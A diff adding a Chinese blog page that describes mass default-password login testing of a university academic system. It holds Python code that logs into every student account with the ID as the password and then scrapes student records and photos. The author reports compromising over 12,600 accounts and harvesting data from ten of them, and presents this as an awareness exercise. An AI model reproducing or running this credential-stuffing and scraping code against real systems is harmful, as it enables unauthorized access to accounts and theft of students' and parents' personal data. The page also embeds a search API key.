@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="爬虫,Python," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="初衷本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！">
+<meta name="keywords" content="爬虫,Python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 第一个爬虫-教务系统信息收集">
+<meta property="og:url" content="/2018/02/24/2018-02-24-Python 第一个爬虫-教务系统信息收集/index.html">
+<meta property="og:site_name" content="摆码王子的小屋">
+<meta property="og:description" content="初衷本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-03-29T14:31:11.022Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python 第一个爬虫-教务系统信息收集">
+<meta name="twitter:description" content="初衷本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'DQH9NUSGTQ',
+      apiKey: 'dd999b30a63c88fb422dc71142c6b7bc',
+      indexName: 'jamesblog_hexo',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"搜索文章标题或内容","hits_empty":"没有在这个星球上找到: ${query}","hits_stats":"共找到 ${hits} 条结果，用时： ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/2018/02/24/2018-02-24-Python 第一个爬虫-教务系统信息收集/"/>
+
+
+
+
+
+  <title>Python 第一个爬虫-教务系统信息收集 | 摆码王子的小屋</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">摆码王子的小屋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">James' Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2018/02/24/2018-02-24-Python 第一个爬虫-教务系统信息收集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="摆码王子的小屋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Python 第一个爬虫-教务系统信息收集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T09:25:00+08:00">
+                2018-02-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/爬虫/" itemprop="url" rel="index">
+                    <span itemprop="name">爬虫</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><p><strong>本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！</strong><br><a id="more"></a><br>作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，<strong>个人信息泄露情况非常严重！</strong></p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">序号</th>
+<th style="text-align:center">学院</th>
+<th style="text-align:center">年级</th>
+<th style="text-align:center">在网账号</th>
+<th style="text-align:center">可爬账号</th>
+<th style="text-align:center">年级占比</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2014</td>
+<td style="text-align:center">3157</td>
+<td style="text-align:center">1998</td>
+<td style="text-align:center">63.29%</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2015</td>
+<td style="text-align:center">3328</td>
+<td style="text-align:center">2234</td>
+<td style="text-align:center">67.13%</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2016</td>
+<td style="text-align:center">3641</td>
+<td style="text-align:center">3066</td>
+<td style="text-align:center">84.21%</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2017</td>
+<td style="text-align:center">3497</td>
+<td style="text-align:center">3326</td>
+<td style="text-align:center">95.11%</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2014</td>
+<td style="text-align:center">1759</td>
+<td style="text-align:center">303</td>
+<td style="text-align:center">17.23%</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2015</td>
+<td style="text-align:center">1643</td>
+<td style="text-align:center">620</td>
+<td style="text-align:center">37.74%</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2016</td>
+<td style="text-align:center">1605</td>
+<td style="text-align:center">1434</td>
+<td style="text-align:center">89.35%</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2017</td>
+<td style="text-align:center">1552</td>
+<td style="text-align:center">639</td>
+<td style="text-align:center">41.17%</td>
+</tr>
+</tbody>
+</table>
+<p><strong>介于初衷，只爬了 10 个账号的信息，以示严重性！</strong></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爬到的学籍信息"></p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。</p>
+<p>Scrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。</p>
+<p>这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="系统的登录界面"></p>
+<p>首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录请求 ( POST )"></p>
+<p>登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="表单参数"></p>
+<p>服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录的响应体"></p>
+<p>刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。</p>
+<p>先引入依赖<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br></pre></td></tr></table></figure></p>
+<p>创建 HTTP 连接池<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http = urllib3.HTTPConnectionPool(</span><br><span class="line">    host=settings.SERVER_HOST,</span><br><span class="line">    port=settings.SERVER_PORT,</span><br><span class="line">    strict=<span class="keyword">False</span>,</span><br><span class="line">    maxsize=<span class="number">100</span>,</span><br><span class="line">    block=<span class="keyword">False</span>,</span><br><span class="line">    retries=<span class="number">100</span>,</span><br><span class="line">    timeout=<span class="number">10</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>请求头的一些固定信息可以预先设定好，伪装浏览器<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;<span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'Keep-alive'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: settings.SERVER_HOST,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>登录并验证是否是初始密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账号校验器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InfoValidate</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.logger = InfoMain.logger</span><br><span class="line">        self.http = InfoMain.http</span><br><span class="line">        <span class="comment"># 有效账号</span></span><br><span class="line">        self.account_valid = []</span><br><span class="line">        <span class="comment"># 可爬账号</span></span><br><span class="line">        self.account_available = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, all_account)</span>:</span></span><br><span class="line">        <span class="comment"># 将所有校验过程加入队列</span></span><br><span class="line">        jobs = [gevent.spawn(self.validate_account, self.http, a) <span class="keyword">for</span> a <span class="keyword">in</span> all_account]</span><br><span class="line">        gevent.joinall(jobs, timeout=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_account</span><span class="params">(self, http, account)</span>:</span></span><br><span class="line">        <span class="comment"># 登录请求参数</span></span><br><span class="line">        param = &#123;<span class="string">"zjh"</span>: account, <span class="string">"mm"</span>: account&#125;</span><br><span class="line">        header = headers.header</span><br><span class="line">        response = http.request(<span class="string">'POST'</span>, settings.URL_LOGIN, fields=param, headers=header)</span><br><span class="line">        self.logger.info(<span class="string">'发送请求&gt;&gt;&#123;&#125;'</span>.format(param))</span><br><span class="line">        self.logger.info(response.status)</span><br><span class="line">        <span class="comment"># 响应体解码</span></span><br><span class="line">        res_text = response.data.decode(<span class="string">'GB2312'</span>, <span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res_text.find(<span class="string">'密码不正确'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="comment"># 密码有误</span></span><br><span class="line">            self.account_valid.append(account)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> res_text.find(<span class="string">'证件号不存在'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="comment"># 账号可爬</span></span><br><span class="line">            self.account_available.append(account)</span><br><span class="line">            self.account_valid.append(account)</span><br><span class="line">            self.logger.info(<span class="string">"账号可用&gt;&gt;&gt;&#123;&#125;"</span>.format(account))</span><br></pre></td></tr></table></figure></p>
+<p>至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="学籍信息页"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="table 的结构"></p>
+<p>一系列的信息都包裹在 <figure class="highlight plain"><figcaption><span>width </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">基于之前对账号的测试，爬取学籍信息</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># 信息收集器</span><br><span class="line">class InfoCollect(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.logger = InfoMain.logger</span><br><span class="line">        self.http = InfoMain.http</span><br><span class="line">        # 功能模块</span><br><span class="line">        self.mod_get_roll_info = settings.MOD_ROLL_INFO</span><br><span class="line">        self.mod_get_roll_img = settings.MOD_ROLL_IMG</span><br><span class="line"></span><br><span class="line">    def get_info_queue(self, accounts):</span><br><span class="line">        # 将所有信息收集过程加入队列</span><br><span class="line">        jobs = [gevent.spawn(self.get_info, a) for a in accounts]</span><br><span class="line">        gevent.joinall(jobs, timeout=0)</span><br><span class="line"></span><br><span class="line">    def get_info(self, stuid):</span><br><span class="line">        # 登录</span><br><span class="line">        param = &#123;&apos;zjh&apos;: stuid, &apos;mm&apos;: stuid&#125;</span><br><span class="line">        response = self.http.request(&apos;POST&apos;, settings.URL_LOGIN, fields=param)</span><br><span class="line">        # 保存 Cookie</span><br><span class="line">        cookie = response.headers[&apos;Set-Cookie&apos;].replace(&apos;; path=/&apos;, &apos;&apos;)</span><br><span class="line">        header = headers.header</span><br><span class="line">        header[&apos;cookie&apos;] = cookie</span><br><span class="line">        # 学籍信息</span><br><span class="line">        if self.mod_get_roll_info:</span><br><span class="line">            # 带 Cookie 访问学籍信息页</span><br><span class="line">            response_xjxx = self.http.request(&apos;GET&apos;, settings.URL_XJXX, headers=header)</span><br><span class="line">            text = response_xjxx.data.decode(&apos;GB2312&apos;, &apos;ignore&apos;)</span><br><span class="line">            # 解析页面内容</span><br><span class="line">            selector = etree.HTML(text)</span><br><span class="line">            text_arr = selector.xpath(&apos;//td[starts-with(@width,&quot;275&quot;)]/text()&apos;)</span><br><span class="line">            # 学籍信息</span><br><span class="line">            result = []</span><br><span class="line">            for info in text_arr:</span><br><span class="line">                result.append(info.strip())</span><br><span class="line">            self.save_info(result)</span><br><span class="line">        # 学籍照片</span><br><span class="line">        if self.mod_get_roll_img:</span><br><span class="line">            response_xjzp = self.http.request(&apos;GET&apos;, settings.URL_XJZP, headers=header)</span><br><span class="line">            image = Image.open(BytesIO(response_xjzp.data))</span><br><span class="line">            setpath = settings.PATH_IMG_SAVE</span><br><span class="line">            path = pathlib.Path(setpath)</span><br><span class="line">            if not path.exists():</span><br><span class="line">                path.mkdir()</span><br><span class="line">            setpath = setpath + &apos;/&apos; + stuid + &apos;.jpg&apos;</span><br><span class="line">            image.save(setpath)</span><br><span class="line">            self.logger.info(&apos;保存照片&gt;&gt;&gt;&#123;&#125;&apos;.format(setpath))</span><br><span class="line"></span><br><span class="line">        # 登出</span><br><span class="line">        self.http.request(&apos;POST&apos;, settings.URL_LOGOUT, headers=header)</span><br></pre></td></tr></table></figure></p>
+<p>至此，已经实现了所有信息的获取以及照片的保存。</p>
+<p>没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。</p>
+<p>相关开源项目：URP_Spider  <a href="https://github.com/JamesZBL/URP_Spider" target="_blank" rel="noopener">https://github.com/JamesZBL/URP_Spider</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/爬虫/" rel="tag"># 爬虫</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/17/2018-02-17-Spring 应用中集成 Apache Shiro/" rel="next" title="Spring 应用中集成 Apache Shiro">
+                <i class="fa fa-chevron-left"></i> Spring 应用中集成 Apache Shiro
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/29/2017-01-01-SpringMVC 解析之 DispatcherServlet/" rel="prev" title="SpringMVC 解析之 DispatcherServlet">
+                SpringMVC 解析之 DispatcherServlet <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="摆码王子" />
+            
+              <p class="site-author-name" itemprop="name">摆码王子</p>
+              <p class="site-description motion-element" itemprop="description">优秀的判断力来自经验<br>但经验来自错误的判断</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/JamesZBL" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://message/?uin=1146556298&Site=摆码王子" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/James1996" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i></a>
+                  </span>
+                
